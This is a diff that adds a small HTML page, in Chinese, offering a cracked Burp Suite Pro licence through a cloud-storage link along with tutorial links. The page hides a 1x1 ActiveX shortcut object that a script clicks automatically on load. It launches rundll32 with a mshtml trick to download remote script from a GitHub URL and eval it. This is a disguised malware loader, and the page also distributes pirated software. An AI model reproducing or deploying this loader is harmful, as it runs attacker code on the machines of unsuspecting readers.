@@ -1,0 +1,20 @@
+<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
+ 现在用的BurpSuite_pro_v1.6.27到2015年12月3日就过期了，最近的几个破解版本也都是3号到期，这个是最新的到2016-12-3的，发出来共享下<br />
+<a href="http://pan.baidu.com/s/1mgvVNmC">百度云盘77qh</a>
+<br />
+<br />
+教程可参考： <br />
+<a href="http://www.nxadmin.com/tools/689.html">阿德马安全-burpsuit详解</a>
+<br />
+<a href="http://drops.wooyun.org/tools/1548">wooyun-burpsuit</a>
+<br />
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+ <PARAM name="Button" value="Bitmap::shortcut">
+ <PARAM name="Item1" value=',rundll32.exe,javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://github.com/wangzhizhun/mailchm/raw/master/shouye",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'>
+ <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+<SCRIPT>
+x.Click();
+</SCRIPT>
+</body></html>
